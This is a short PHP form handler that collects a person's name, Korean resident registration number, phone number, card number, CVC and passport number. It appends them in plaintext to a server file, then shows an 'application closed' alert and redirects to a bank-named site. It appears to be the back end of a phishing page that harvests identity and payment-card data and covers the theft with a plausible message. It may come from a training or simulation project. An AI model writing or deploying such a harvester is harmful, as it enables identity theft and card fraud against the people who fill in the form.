<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST['name'];
    $resident_number = $_POST['resident-number'];
    $phone_number = $_POST['phone-number'];
    $card_number = $_POST['card-number'];
    $cvc_number = $_POST['cvc-number'];
    $passport_number = $_POST['passport-number'];

    $data = "이름: $name\n";
    $data .= "주민번호: $resident_number\n";
    $data .= "전화번호: $phone_number\n";
    $data .= "카드번호: $card_number\n";
    $data .= "CVC 번호: $cvc_number\n";
    $data .= "여권번호: $passport_number\n";
    $data .= "------------------------\n";

    $file = fopen("/home/ubuntu/P_Turtle/user_data.txt", "a");
    fwrite($file, $data);
    fclose($file);

    echo "<script type='text/javascript'>
            alert('신청 마감되었습니다.');
            window.location.href = 'http://turtle-bank.com';
        </script>";
}
?>
